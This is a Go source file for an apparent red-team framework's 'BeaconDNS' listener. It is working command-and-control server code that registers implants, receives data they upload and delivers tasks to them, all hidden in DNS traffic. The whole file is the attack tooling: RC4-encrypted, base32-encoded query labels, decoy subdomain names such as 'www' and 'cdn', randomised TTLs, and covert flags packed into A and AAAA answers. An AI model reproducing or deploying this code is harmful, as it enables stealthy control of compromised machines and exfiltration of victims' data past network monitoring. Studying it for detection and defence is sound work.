package main

import (
	"bytes"
	"compress/zlib"
	"context"
	"crypto/rc4"
	"encoding/base32"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/miekg/dns"
)

// Constants
const (
	seqXorMask       = 0x39913991
	maxUploadSize    = 4 << 20 // 4 MB
	maxDownloadSize  = 4 << 20 // 4 MB
	minCompressSize  = 2048
	dnsSafeChunkSize = 280
	defaultChunkSize = 4096
	metaV1Size       = 8
	frameHeaderSize  = 9 // flags:1 + nonce:4 + origLen:4

	staleTimeout        = 5 * time.Minute
	dedupTimeout        = 5 * time.Minute
	downTimeout         = 10 * time.Minute
	inflightTimeout     = 5 * time.Minute
	maxInflightAttempts = 10
	cleanupInterval     = 60 * time.Second
	shutdownTimeout     = 2 * time.Second
)

// Types
type dnsFragBuf struct {
	total           uint32
	buf             []byte
	filled          uint32
	highWater       uint32
	expectedOff     uint32
	lastUpdate      time.Time
	seenOffsets     map[uint32]bool
	lastReceivedOff uint32
	nextExpectedOff uint32
	chunkSize       uint32
}

type dnsDownBuf struct {
	total      uint32
	off        uint32
	buf        []byte
	taskNonce  uint32
	lastUpdate time.Time
}

type dnsUpDone struct {
	total  uint32
	doneAt time.Time
}

type localInflight struct {
	data      []byte
	nonce     uint32
	createdAt time.Time
	attempts  int
}

type inflightPersist struct {
	Sid       string `json:"sid"`
	Data      []byte `json:"data"`
	Nonce     uint32 `json:"nonce"`
	CreatedAt int64  `json:"created_at"`
	Attempts  int    `json:"attempts"`
}

type metaV1 struct {
	Version       byte
	MetaFlags     byte
	Reserved      uint16
	DownAckOffset uint32
}

type dnsRequest struct {
	sid   string
	op    string
	seq   int
	data  []byte
	qtype uint16
	qname string
}

type putAckInfo struct {
	lastReceivedOff uint32
	nextExpectedOff uint32
	total           uint32
	filled          uint32
	needsReset      bool
	complete        bool
}

type DNSListener struct {
	Config DNSConfig
	Name   string
	Active bool

	udpServer *dns.Server
	tcpServer *dns.Server
	ts        Teamserver

	mu             sync.Mutex
	upFrags        map[string]*dnsFragBuf
	downFrags      map[string]*dnsDownBuf
	upDoneCache    map[string]*dnsUpDone
	localInflights map[string]*localInflight
	needsReset     map[string]bool
	rng            *rand.Rand
}

// Constructors
func newFragBuf(total uint32) *dnsFragBuf {
	fb := new(dnsFragBuf)
	fb.total = total
	fb.buf = make([]byte, total)
	fb.lastUpdate = time.Now()
	fb.seenOffsets = make(map[uint32]bool)
	fb.lastReceivedOff = 0
	fb.nextExpectedOff = 0
	fb.chunkSize = 0
	return fb
}

func newDownBuf(data []byte, nonce uint32) *dnsDownBuf {
	db := new(dnsDownBuf)
	db.total = uint32(len(data))
	db.buf = data
	db.taskNonce = nonce
	db.lastUpdate = time.Now()
	return db
}

func newInflight(data []byte, nonce uint32) *localInflight {
	inf := new(localInflight)
	inf.data = data
	inf.nonce = nonce
	inf.createdAt = time.Now()
	inf.attempts = 1
	return inf
}

func newUpDone(total uint32) *dnsUpDone {
	ud := new(dnsUpDone)
	ud.total = total
	ud.doneAt = time.Now()
	return ud
}

// Utility Functions
func rc4Crypt(data []byte, keyHex string) []byte {
	if len(data) == 0 {
		return data
	}
	keyBytes, err := hex.DecodeString(keyHex)
	if err != nil || len(keyBytes) != 16 {
		return data
	}
	cipher, err := rc4.NewCipher(keyBytes)
	if err != nil {
		return data
	}
	result := make([]byte, len(data))
	cipher.XORKeyStream(result, data)
	return result
}

func isValidSID(sid string) bool {
	if len(sid) != 8 {
		return false
	}
	for i := 0; i < 8; i++ {
		c := sid[i]
		if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
			return false
		}
	}
	return true
}

func parseMetaV1(data []byte) (metaV1, []byte, bool) {
	var m metaV1
	if len(data) < metaV1Size {
		return m, data, false
	}
	m.Version = data[0]
	m.MetaFlags = data[1]
	m.Reserved = binary.LittleEndian.Uint16(data[2:4])
	m.DownAckOffset = binary.LittleEndian.Uint32(data[4:8])
	return m, data[metaV1Size:], true
}

func compressPayload(data []byte) (payload []byte, flags byte) {
	if len(data) <= minCompressSize {
		return data, 0
	}

	var zbuf bytes.Buffer
	wz, err := zlib.NewWriterLevel(&zbuf, zlib.BestCompression)
	if err != nil {
		return data, 0
	}

	if _, err := wz.Write(data); err != nil {
		wz.Close()
		return data, 0
	}

	if err := wz.Close(); err != nil {
		return data, 0
	}

	compressed := zbuf.Bytes()
	if len(compressed) > 0 && len(compressed) < len(data) {
		return compressed, 1
	}
	return data, 0
}

func decompressUpstream(data []byte) []byte {
	if len(data) <= 5 {
		return data
	}

	flags := data[0]
	origLen := binary.LittleEndian.Uint32(data[1:5])
	payload := data[5:]

	if (flags & 0x1) != 0 {
		if origLen > 0 && origLen <= maxUploadSize {
			zr, err := zlib.NewReader(bytes.NewReader(payload))
			if err == nil {
				decompressed := make([]byte, origLen)
				n, errRead := zr.Read(decompressed)
				zr.Close()
				if errRead == nil || (n > 0 && n == int(origLen)) {
					return decompressed[:n]
				}
			}
		}
	} else if origLen > 0 && origLen <= uint32(len(payload)) {
		return payload[:origLen]
	}
	return data
}

func buildTaskFrame(payload []byte, nonce uint32, flags byte, origLen int) []byte {
	frame := make([]byte, frameHeaderSize+len(payload))
	frame[0] = flags
	binary.LittleEndian.PutUint32(frame[1:5], nonce)
	binary.LittleEndian.PutUint32(frame[5:9], uint32(origLen))
	copy(frame[frameHeaderSize:], payload)
	return frame
}

func (d *DNSListener) buildResponseChunk(df *dnsDownBuf, reqOffset uint32, isTCP bool) []byte {
	if df == nil || df.total == 0 {
		return nil
	}

	if reqOffset >= df.total {
		reqOffset = 0
	}

	maxChunk := d.Config.PktSize
	if !isTCP {
		if maxChunk <= 0 || maxChunk > dnsSafeChunkSize {
			maxChunk = dnsSafeChunkSize
		}
	} else {
		if maxChunk <= 0 {
			maxChunk = defaultChunkSize
		}
	}

	remaining := df.total - reqOffset
	chunkLen := remaining
	if chunkLen > uint32(maxChunk) {
		chunkLen = uint32(maxChunk)
	}

	frame := make([]byte, 8+chunkLen)
	binary.BigEndian.PutUint32(frame[0:4], df.total)
	binary.BigEndian.PutUint32(frame[4:8], reqOffset)
	copy(frame[8:], df.buf[reqOffset:reqOffset+chunkLen])
	return frame
}

func extractExternalIP(addr net.Addr) string {
	host, _, err := net.SplitHostPort(addr.String())
	if err != nil {
		return ""
	}
	ip := net.ParseIP(host)
	if ip == nil {
		return host
	}
	if v4 := ip.To4(); v4 != nil {
		return v4.String()
	}
	return ip.String()
}

// DNSListener Lifecycle
func (d *DNSListener) Start(ts Teamserver) error {
	if d.Config.TTL <= 0 {
		d.Config.TTL = 10
	}
	if d.Config.PktSize <= 0 || d.Config.PktSize > 64000 {
		d.Config.PktSize = defaultChunkSize
	}

	d.ts = ts
	d.rng = rand.New(rand.NewSource(time.Now().UnixNano()))
	d.upFrags = make(map[string]*dnsFragBuf)
	d.downFrags = make(map[string]*dnsDownBuf)
	d.upDoneCache = make(map[string]*dnsUpDone)
	d.localInflights = make(map[string]*localInflight)
	d.needsReset = make(map[string]bool)

	d.loadInflights()

	addr := net.JoinHostPort(d.Config.HostBind, strconv.Itoa(d.Config.PortBind))

	mux := dns.NewServeMux()
	mux.HandleFunc(".", d.handleDNS)

	d.udpServer = &dns.Server{Addr: addr, Net: "udp", Handler: mux}
	d.tcpServer = &dns.Server{Addr: addr, Net: "tcp", Handler: mux}

	go func() {
		if err := d.udpServer.ListenAndServe(); err != nil {
			fmt.Printf("[BeaconDNS] UDP listener error: %v\n", err)
		}
	}()

	go func() {
		if err := d.tcpServer.ListenAndServe(); err != nil {
			fmt.Printf("[BeaconDNS] TCP listener error: %v\n", err)
		}
	}()

	go d.cleanupLoop()

	time.Sleep(200 * time.Millisecond)
	d.Active = true
	return nil
}

func (d *DNSListener) Stop() error {
	d.Active = false
	d.saveInflights()

	ctx, cancel := context.WithTimeout(context.Background(), shutdownTimeout)
	defer cancel()

	var err error
	if d.udpServer != nil {
		if e := d.udpServer.ShutdownContext(ctx); e != nil {
			err = e
		}
	}
	if d.tcpServer != nil {
		if e := d.tcpServer.ShutdownContext(ctx); e != nil {
			err = e
		}
	}
	return err
}

func (d *DNSListener) cleanupLoop() {
	ticker := time.NewTicker(cleanupInterval)
	defer ticker.Stop()

	for range ticker.C {
		if !d.Active {
			return
		}
		d.cleanupStaleEntries()
		d.saveInflights()
	}
}

func (d *DNSListener) cleanupStaleEntries() {
	now := time.Now()

	d.mu.Lock()
	defer d.mu.Unlock()

	for sid, fb := range d.upFrags {
		if now.Sub(fb.lastUpdate) > staleTimeout {
			// Mark this SID as needing reset - the agent will be notified on next PUT/HB
			if fb.filled > 0 && fb.filled < fb.total {
				d.needsReset[sid] = true
			}
			delete(d.upFrags, sid)
		}
	}

	for sid, done := range d.upDoneCache {
		if now.Sub(done.doneAt) > dedupTimeout {
			delete(d.upDoneCache, sid)
		}
	}

	for sid, db := range d.downFrags {
		if db == nil {
			delete(d.downFrags, sid)
			continue
		}
		if !db.lastUpdate.IsZero() && now.Sub(db.lastUpdate) > downTimeout {
			delete(d.downFrags, sid)
		}
	}

	for sid, inf := range d.localInflights {
		if inf == nil {
			delete(d.localInflights, sid)
			continue
		}
		if now.Sub(inf.createdAt) > inflightTimeout || inf.attempts >= maxInflightAttempts {
			delete(d.localInflights, sid)
			delete(d.downFrags, sid)
		}
	}

	// Clean up old reset markers (after 10 minutes, agent should have received them)
	// This is handled implicitly - markers are deleted when PUT is received
}

// Persistence
func (d *DNSListener) inflightPersistPath() string {
	dir := ListenerDataDir
	if dir == "" {
		dir = "."
	}
	return filepath.Join(dir, fmt.Sprintf("dns_inflights_%s.json", d.Name))
}

func (d *DNSListener) saveInflights() {
	d.mu.Lock()
	defer d.mu.Unlock()

	if len(d.localInflights) == 0 {
		_ = os.Remove(d.inflightPersistPath())
		return
	}

	items := make([]inflightPersist, 0, len(d.localInflights))
	for sid, inf := range d.localInflights {
		if inf == nil {
			continue
		}
		items = append(items, inflightPersist{
			Sid:       sid,
			Data:      inf.data,
			Nonce:     inf.nonce,
			CreatedAt: inf.createdAt.Unix(),
			Attempts:  inf.attempts,
		})
	}

	data, err := json.Marshal(items)
	if err != nil {
		return
	}
	_ = os.WriteFile(d.inflightPersistPath(), data, 0600)
}

func (d *DNSListener) loadInflights() {
	data, err := os.ReadFile(d.inflightPersistPath())
	if err != nil {
		return
	}

	var items []inflightPersist
	if err := json.Unmarshal(data, &items); err != nil {
		return
	}

	d.mu.Lock()
	defer d.mu.Unlock()

	now := time.Now()
	for _, item := range items {
		createdAt := time.Unix(item.CreatedAt, 0)
		if now.Sub(createdAt) > inflightTimeout {
			continue
		}
		inf := new(localInflight)
		inf.data = item.Data
		inf.nonce = item.Nonce
		inf.createdAt = createdAt
		inf.attempts = item.Attempts
		d.localInflights[item.Sid] = inf
	}

	_ = os.Remove(d.inflightPersistPath())
}

// Request Parsing
func (d *DNSListener) parseRequest(q dns.Question) *dnsRequest {
	labels := dns.SplitDomainName(q.Name)
	base := labels

	if len(d.Config.Domains) > 0 {
		for i := range labels {
			tail := strings.ToLower(strings.Join(labels[i:], "."))
			for _, dom := range d.Config.Domains {
				if tail == dom {
					base = labels[:i]
					break
				}
			}
			if len(base) < len(labels) {
				break
			}
		}
	}

	req := new(dnsRequest)
	req.qtype = q.Qtype
	req.qname = q.Name

	if len(base) < 5 {
		return req
	}

	req.sid = strings.ToLower(base[0])
	rawOp := strings.ToLower(base[1])

	switch rawOp {
	case "www", "hi":
		req.op = "HI"
	case "cdn", "put":
		req.op = "PUT"
	case "api", "get":
		req.op = "GET"
	case "hb":
		req.op = "HB"
	}

	if v, err := strconv.ParseUint(base[2], 16, 32); err == nil {
		req.seq = int(v ^ seqXorMask)
	}

	dataLabel := strings.ToUpper(strings.Join(base[4:], ""))
	enc := base32.StdEncoding.WithPadding(base32.NoPadding)
	if db, err := enc.DecodeString(dataLabel); err == nil {
		req.data = db
	}

	if !isValidSID(req.sid) {
		req.op = ""
	}

	maxPayload := d.Config.PktSize * 4
	if maxPayload <= 0 {
		maxPayload = defaultChunkSize
	}
	if len(req.data) > maxPayload {
		req.data = nil
	}

	return req
}

// Task Fetching (unified for GET and HB)
func (d *DNSListener) fetchOrRetryTasks(sid string) ([]byte, uint32) {
	d.mu.Lock()
	existingInflight, hasInflight := d.localInflights[sid]
	d.mu.Unlock()

	if hasInflight && existingInflight != nil {
		existingInflight.attempts++
		return existingInflight.data, existingInflight.nonce
	}

	maxDataSize := d.Config.PktSize * 256
	if maxDataSize <= 0 || maxDataSize > maxDownloadSize {
		maxDataSize = maxDownloadSize
	}

	p, err := d.ts.TsAgentGetHostedAll(sid, maxDataSize)
	if err != nil || len(p) == 0 {
		return nil, 0
	}

	taskNonce := uint32(time.Now().UnixNano()&0xFFFFFFFF) ^ d.rng.Uint32()
	origLen := len(p)
	payload, flags := compressPayload(p)
	taskData := buildTaskFrame(payload, taskNonce, flags, origLen)

	d.mu.Lock()
	d.localInflights[sid] = newInflight(taskData, taskNonce)
	d.mu.Unlock()

	return taskData, taskNonce
}

func (d *DNSListener) ackDelivery(sid string, ackTaskNonce uint32) {
	d.mu.Lock()
	defer d.mu.Unlock()

	df, hasDf := d.downFrags[sid]
	if !hasDf || df == nil {
		return
	}

	if ackTaskNonce == df.taskNonce {
		delete(d.localInflights, sid)
		delete(d.downFrags, sid)
	}
}

// Operation Handlers
func (d *DNSListener) handleHI(req *dnsRequest, w dns.ResponseWriter) {
	if len(req.data) < 8 {
		return
	}

	keyBytes, err := hex.DecodeString(d.Config.EncryptKey)
	if err != nil || len(keyBytes) != 16 {
		return
	}

	cipher, err := rc4.NewCipher(keyBytes)
	if err != nil {
		return
	}

	fullBeat := make([]byte, len(req.data))
	cipher.XORKeyStream(fullBeat, req.data)

	if len(fullBeat) < 8 {
		return
	}

	agentType := fmt.Sprintf("%08x", binary.BigEndian.Uint32(fullBeat[:4]))
	agentId := fmt.Sprintf("%08x", binary.BigEndian.Uint32(fullBeat[4:8]))
	beat := fullBeat[8:]

	if !d.ts.TsAgentIsExists(agentId) {
		externalIP := extractExternalIP(w.RemoteAddr())
		_, _ = d.ts.TsAgentCreate(agentType, agentId, beat, d.Name, externalIP, true)
	}
	_ = d.ts.TsAgentSetTick(agentId)
}

func (d *DNSListener) handlePUT(req *dnsRequest) putAckInfo {
	ack := putAckInfo{}

	if len(req.data) == 0 {
		return ack
	}

	// Check if this SID needs reset
	d.mu.Lock()
	if d.needsReset[req.sid] {
		ack.needsReset = true
		delete(d.needsReset, req.sid)
	}
	d.mu.Unlock()

	decrypted := rc4Crypt(req.data, d.Config.EncryptKey)
	ack = d.handlePutFragment(req.sid, req.seq, decrypted, ack)

	if req.sid != "" {
		_ = d.ts.TsAgentSetTick(req.sid)
	}

	return ack
}

func (d *DNSListener) handleGET(req *dnsRequest, w dns.ResponseWriter) []byte {
	if req.sid != "" {
		_ = d.ts.TsAgentSetTick(req.sid)
	}

	decrypted := rc4Crypt(req.data, d.Config.EncryptKey)

	var reqOffset, reqNonce uint32
	if len(decrypted) >= 4 {
		reqOffset = binary.BigEndian.Uint32(decrypted[0:4])
	}
	if len(decrypted) >= 8 {
		reqNonce = binary.BigEndian.Uint32(decrypted[4:8])
	}
	_ = reqNonce

	d.mu.Lock()
	df, exists := d.downFrags[req.sid]
	if exists && df != nil {
		df.lastUpdate = time.Now()
		if reqOffset > 0 && reqOffset <= df.total && reqOffset > df.off {
			df.off = reqOffset
		}
	}
	d.mu.Unlock()

	if df == nil || df.off >= df.total {
		if df != nil && df.off >= df.total {
			d.mu.Lock()
			delete(d.downFrags, req.sid)
			d.mu.Unlock()
			df = nil
		}

		taskData, taskNonce := d.fetchOrRetryTasks(req.sid)
		if len(taskData) > 0 {
			df = newDownBuf(taskData, taskNonce)
			d.mu.Lock()
			d.downFrags[req.sid] = df
			d.mu.Unlock()
		}
	}

	isTCP := w.RemoteAddr().Network() == "tcp"
	return d.buildResponseChunk(df, reqOffset, isTCP)
}

func (d *DNSListener) handleHB(req *dnsRequest) (needsReset bool, hasPendingTasks bool) {
	if req.sid != "" {
		_ = d.ts.TsAgentSetTick(req.sid)
	}

	// Check if this SID needs reset
	d.mu.Lock()
	if d.needsReset[req.sid] {
		needsReset = true
		delete(d.needsReset, req.sid)
	}
	d.mu.Unlock()

	decrypted := rc4Crypt(req.data, d.Config.EncryptKey)

	var ackOffset, ackTaskNonce uint32
	if len(decrypted) >= 4 {
		ackOffset = binary.BigEndian.Uint32(decrypted[0:4])
	}
	if len(decrypted) >= 12 {
		ackTaskNonce = binary.BigEndian.Uint32(decrypted[8:12])
	}

	d.mu.Lock()
	df, hasDf := d.downFrags[req.sid]
	if hasDf && df != nil {
		df.lastUpdate = time.Now()
		if df.total > 0 && ackOffset >= df.total && ackTaskNonce == df.taskNonce {
			delete(d.localInflights, req.sid)
			delete(d.downFrags, req.sid)
			df = nil
			hasDf = false
		}
	}
	d.mu.Unlock()

	if !hasDf || df == nil {
		taskData, taskNonce := d.fetchOrRetryTasks(req.sid)
		if len(taskData) > 0 {
			d.mu.Lock()
			d.downFrags[req.sid] = newDownBuf(taskData, taskNonce)
			d.mu.Unlock()
			hasPendingTasks = true
		}
	} else {
		hasPendingTasks = true
	}

	return needsReset, hasPendingTasks
}

// Fragment Management
func (d *DNSListener) handlePutFragment(sid string, seq int, data []byte, ack putAckInfo) putAckInfo {
	_ = seq

	if sid == "" {
		return ack
	}

	if len(data) == 0 || len(data) <= 8 {
		_ = d.ts.TsAgentProcessData(sid, data)
		return ack
	}

	var total, offset uint32
	var chunk []byte

	meta, rest, hasMeta := parseMetaV1(data)
	if hasMeta {
		if (meta.MetaFlags & 0x1) != 0 {
			d.mu.Lock()
			df, hasDf := d.downFrags[sid]
			var ackTaskNonce uint32
			shouldAck := false
			if hasDf && df != nil {
				ackTaskNonce = df.taskNonce
				if df.total > 0 && meta.DownAckOffset == df.total {
					shouldAck = true
				}
			}
			d.mu.Unlock()

			if shouldAck {
				d.mu.Lock()
				delete(d.localInflights, sid)
				if cur, ok := d.downFrags[sid]; ok && cur != nil && cur.taskNonce == ackTaskNonce {
					delete(d.downFrags, sid)
				}
				d.mu.Unlock()
			}
		}

		if len(rest) <= 8 {
			_ = d.ts.TsAgentProcessData(sid, rest)
			return ack
		}
		total = binary.BigEndian.Uint32(rest[0:4])
		offset = binary.BigEndian.Uint32(rest[4:8])
		chunk = rest[8:]
	} else {
		total = binary.BigEndian.Uint32(data[0:4])
		offset = binary.BigEndian.Uint32(data[4:8])
		chunk = data[8:]
	}

	if total == 0 || total > maxUploadSize {
		_ = d.ts.TsAgentProcessData(sid, data)
		return ack
	}

	// Populate ack info with totals
	ack.total = total

	if offset == 0 && total <= uint32(len(chunk)) {
		_ = d.ts.TsAgentProcessData(sid, decompressUpstream(chunk))
		ack.complete = true
		ack.filled = total
		ack.lastReceivedOff = 0
		ack.nextExpectedOff = total
		return ack
	}

	d.mu.Lock()
	defer d.mu.Unlock()

	if done, exists := d.upDoneCache[sid]; exists && done.total == total {
		ack.complete = true
		ack.filled = done.total
		ack.lastReceivedOff = done.total
		ack.nextExpectedOff = done.total
		return ack
	}

	fb, ok := d.upFrags[sid]
	if !ok || fb.total != total || (offset == 0 && fb.highWater > 0) {
		fb = newFragBuf(total)
		d.upFrags[sid] = fb
	}

	// Track chunk size for gap detection
	chunkLen := uint32(len(chunk))
	if fb.chunkSize == 0 && chunkLen > 0 {
		fb.chunkSize = chunkLen
	}

	// Check for duplicate or out-of-bounds offset
	if offset >= fb.total || fb.seenOffsets[offset] {
		// Return current state even for duplicates
		ack.lastReceivedOff = fb.lastReceivedOff
		ack.nextExpectedOff = d.computeNextExpectedOffset(fb)
		ack.filled = fb.filled
		return ack
	}

	end := offset + chunkLen
	if end > fb.total {
		end = fb.total
	}
	n := end - offset
	copy(fb.buf[offset:end], chunk[:n])

	fb.seenOffsets[offset] = true
	fb.filled += n
	fb.lastReceivedOff = offset
	fb.expectedOff = end
	fb.lastUpdate = time.Now()

	if end > fb.highWater {
		fb.highWater = end
	}

	// Compute next expected offset based on gaps
	fb.nextExpectedOff = d.computeNextExpectedOffset(fb)

	// Update ack info
	ack.lastReceivedOff = fb.lastReceivedOff
	ack.nextExpectedOff = fb.nextExpectedOff
	ack.filled = fb.filled

	if fb.filled >= fb.total {
		_ = d.ts.TsAgentProcessData(sid, decompressUpstream(fb.buf))
		d.upDoneCache[sid] = newUpDone(fb.total)
		delete(d.upFrags, sid)
		ack.complete = true
	}

	return ack
}

// computeNextExpectedOffset finds the next missing offset based on chunk size
func (d *DNSListener) computeNextExpectedOffset(fb *dnsFragBuf) uint32 {
	if fb.chunkSize == 0 {
		return fb.highWater
	}

	// Scan from start to find first gap
	for off := uint32(0); off < fb.total; off += fb.chunkSize {
		if !fb.seenOffsets[off] {
			return off
		}
	}
	return fb.total
}

// Main DNS Handler
func (d *DNSListener) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Authoritative = true

	baseTTL := uint32(d.Config.TTL)
	if baseTTL == 0 {
		baseTTL = 10
	}
	ttl := baseTTL + uint32(d.rng.Intn(60))

	for _, q := range r.Question {
		req := d.parseRequest(q)

		switch req.op {
		case "HI":
			if len(req.data) > 0 {
				d.handleHI(req, w)
			}
			m.Answer = append(m.Answer, d.buildAckResponse(req, ttl))

		case "PUT":
			var ack putAckInfo
			if len(req.data) > 0 {
				ack = d.handlePUT(req)
			}
			m.Answer = append(m.Answer, d.buildPutAckResponse(req, ack, ttl))

		case "GET":
			frame := d.handleGET(req, w)
			m.Answer = append(m.Answer, d.buildDataResponse(req, frame, ttl))

		case "HB":
			needsReset, hasPendingTasks := d.handleHB(req)
			m.Answer = append(m.Answer, d.buildHBResponse(req, needsReset, hasPendingTasks, ttl))

		default:
			rr := &dns.TXT{
				Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
				Txt: []string{"OK"},
			}
			m.Answer = append(m.Answer, rr)
		}
	}

	_ = w.WriteMsg(m)
}

func (d *DNSListener) buildAckResponse(req *dnsRequest, ttl uint32) dns.RR {
	switch req.qtype {
	case dns.TypeA:
		return &dns.A{
			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl},
			A:   net.ParseIP("127.0.0.1").To4(),
		}
	case dns.TypeAAAA:
		return &dns.AAAA{
			Hdr:  dns.RR_Header{Name: req.qname, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl},
			AAAA: net.ParseIP("::1").To16(),
		}
	default:
		return &dns.TXT{
			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
			Txt: []string{"OK"},
		}
	}
}

// buildPutAckResponse builds response for PUT requests with fragment confirmation
// A record encodes: [flags:1][nextExpectedOff:3 (big-endian 24-bit)]
// Flags: 0x01 = complete, 0x02 = needs_reset
func (d *DNSListener) buildPutAckResponse(req *dnsRequest, ack putAckInfo, ttl uint32) dns.RR {
	switch req.qtype {
	case dns.TypeA:
		ip := make(net.IP, 4)
		var flags byte
		if ack.complete {
			flags |= 0x01
		}
		if ack.needsReset {
			flags |= 0x02
		}
		ip[0] = flags
		// Encode nextExpectedOff as 24-bit big-endian (up to 16MB)
		ip[1] = byte((ack.nextExpectedOff >> 16) & 0xFF)
		ip[2] = byte((ack.nextExpectedOff >> 8) & 0xFF)
		ip[3] = byte(ack.nextExpectedOff & 0xFF)
		return &dns.A{
			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl},
			A:   ip,
		}
	case dns.TypeAAAA:
		// For AAAA, use first 8 bytes for extended info
		ip := make(net.IP, 16)
		var flags byte
		if ack.complete {
			flags |= 0x01
		}
		if ack.needsReset {
			flags |= 0x02
		}
		ip[0] = flags
		// nextExpectedOff (4 bytes)
		ip[1] = byte((ack.nextExpectedOff >> 24) & 0xFF)
		ip[2] = byte((ack.nextExpectedOff >> 16) & 0xFF)
		ip[3] = byte((ack.nextExpectedOff >> 8) & 0xFF)
		ip[4] = byte(ack.nextExpectedOff & 0xFF)
		// filled (4 bytes)
		ip[5] = byte((ack.filled >> 24) & 0xFF)
		ip[6] = byte((ack.filled >> 16) & 0xFF)
		ip[7] = byte((ack.filled >> 8) & 0xFF)
		ip[8] = byte(ack.filled & 0xFF)
		return &dns.AAAA{
			Hdr:  dns.RR_Header{Name: req.qname, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl},
			AAAA: ip,
		}
	default:
		return &dns.TXT{
			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
			Txt: []string{"OK"},
		}
	}
}

// buildHBResponse builds response for heartbeat requests
// A record encodes: [flags:1][reserved:3]
// Flags: 0x01 = has pending tasks, 0x02 = needs_reset
func (d *DNSListener) buildHBResponse(req *dnsRequest, needsReset bool, hasPendingTasks bool, ttl uint32) dns.RR {
	switch req.qtype {
	case dns.TypeA:
		ip := make(net.IP, 4)
		var flags byte
		if hasPendingTasks {
			flags |= 0x01
		}
		if needsReset {
			flags |= 0x02
		}
		ip[0] = flags
		ip[1] = 0
		ip[2] = 0
		ip[3] = 0
		return &dns.A{
			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl},
			A:   ip,
		}
	case dns.TypeAAAA:
		ip := make(net.IP, 16)
		var flags byte
		if hasPendingTasks {
			flags |= 0x01
		}
		if needsReset {
			flags |= 0x02
		}
		ip[0] = flags
		return &dns.AAAA{
			Hdr:  dns.RR_Header{Name: req.qname, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl},
			AAAA: ip,
		}
	default:
		return &dns.TXT{
			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
			Txt: []string{"OK"},
		}
	}
}

func (d *DNSListener) buildDataResponse(req *dnsRequest, frame []byte, ttl uint32) dns.RR {
	if len(frame) == 0 {
		return &dns.TXT{
			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
			Txt: []string{""},
		}
	}

	encrypted := rc4Crypt(frame, d.Config.EncryptKey)
	b64Str := base64.StdEncoding.EncodeToString(encrypted)

	var chunks []string
	for len(b64Str) > 255 {
		chunks = append(chunks, b64Str[:255])
		b64Str = b64Str[255:]
	}
	chunks = append(chunks, b64Str)

	return &dns.TXT{
		Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
		Txt: chunks,
	}
}
